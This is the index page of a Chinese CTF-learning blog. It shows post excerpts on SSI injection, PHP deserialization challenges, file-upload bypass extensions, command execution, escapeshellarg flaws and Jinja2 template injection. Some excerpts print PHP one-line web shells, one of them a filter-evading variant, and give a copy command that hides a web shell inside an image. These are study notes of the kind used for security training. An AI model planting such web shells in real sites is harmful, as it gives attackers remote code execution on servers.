<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-postlist"><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">ssi服务端包含注入</a></h1><div class="p-content"><h1 id="SSI注入漏洞"><a href="#SSI注入漏洞" class="headerlink" title="SSI注入漏洞"></a>SSI注入漏洞</h1><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p></div><p class="p-readmore"><a href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">2021-10-13</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/ssi/">ssi</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ssi/">ssi</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/13/MRCTF2020-Ezpop/">MRCTF2020-Ezpop</a></h1><div class="p-content"><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="MRCTF2020-Ezpop"></a>MRCTF2020-Ezpop</h1><p>打开网页，代码如下：</p>
<pre><code>Welcome to index.php</div><p class="p-readmore"><a href="/2021/10/13/MRCTF2020-Ezpop/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/13/MRCTF2020-Ezpop/">2021-10-13</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/10/0CTF-2016-piapiapia/">0CTF 2016-piapiapia</a></h1><div class="p-content"><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h1><p>代码审计还有PHP反序列化一直是我的硬伤，所以想借助这个题目来理一理思路。</p></div><p class="p-readmore"><a href="/2021/10/10/0CTF-2016-piapiapia/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/10/0CTF-2016-piapiapia/">2021-10-10</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/10/SUCTF2019-python-nginx/">SUCTF2019-python-nginx</a></h1><div class="p-content"><p>题目源码：</p>
<pre><code>@app.route(&#39;/getUrl&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) 
def getUrl(): 
  url = request.args.get(&quot;url&quot;) </div><p class="p-readmore"><a href="/2021/10/10/SUCTF2019-python-nginx/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/10/SUCTF2019-python-nginx/">2021-10-10</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%88%B7%E9%A2%98/">刷题</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%88%B7%E9%A2%98/">刷题</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马执行</a></h1><div class="p-content"><p>正常：<br><?php
@eval($_POST['x']);
?></p>
<p>如果有&lt;?过滤，采用：</p>
<script language="php">eval($_REQUEST[x])</script></div><p class="p-readmore"><a href="/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/08/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">2021-10-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/">简单图片马的制作</a></h1><div class="p-content"><p>1.首先图片命名111.jpg</p>
<p>2.再新建222.asp文件，一句话木马写入</p>
<p>3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg</p>
<p>最后就会出现新的图片3333.jpg，就是制作出的图片马。</p></div><p class="p-readmore"><a href="/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/08/%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C/">2021-10-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传之后缀替换</a></h1><div class="p-content"><p>php2，php3、php4、php5，pht，phtml，phps</p>
<p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF89A”<br> .zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p></div><p class="p-readmore"><a href="/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/08/%E5%90%8E%E7%BC%80%E6%9B%BF%E6%8D%A2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">2021-10-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></h1><div class="p-content"><p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p></div><p class="p-readmore"><a href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">2021-10-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/">代码\命令执行类</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/">escapeshellarg+escapeshellcmd 函数漏洞</a></h1><div class="p-content"><p> escapeshellarg(string $arg): string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。<br>escapeshellcmd<br> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p></div><p class="p-readmore"><a href="/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/08/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%BD%E6%95%B0/">2021-10-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/">常见函数</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E5%87%BD%E6%95%B0/">函数</a></span></div></div><div class="l-post"><div class="p-desc box"><div class="p-pic"></div><h1 class="p-title"><a href="/2021/10/08/ssti/">ssti</a></h1><div class="p-content"><p>&#123;&#123; worldcount&#40;post.content&#41; &#125;&#125;</p>
<p>Flask使用Jinja2作为模板引擎<br>语法：<br>&#123;%…%&#125;语句(statements)<br>&#123;&#123;…&#125;&#125;打印模板输出的表达式(Expressions)<br>&#123;#…#&#125;注释<br>#…##行语句(Line Statements)</p></div><p class="p-readmore"><a href="/2021/10/08/ssti/">阅读更多 &gt;&gt;</a></p></div><div class="p-info box"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2021/10/08/ssti/">2021-10-08</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">模板注入</a></span><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ssti/">ssti</a></span></div></div></div><div class="l-pager l-pager-id box" id="page-nav"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页&gt;</a></div><footer><p>Copyright © 2016 - 2021 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>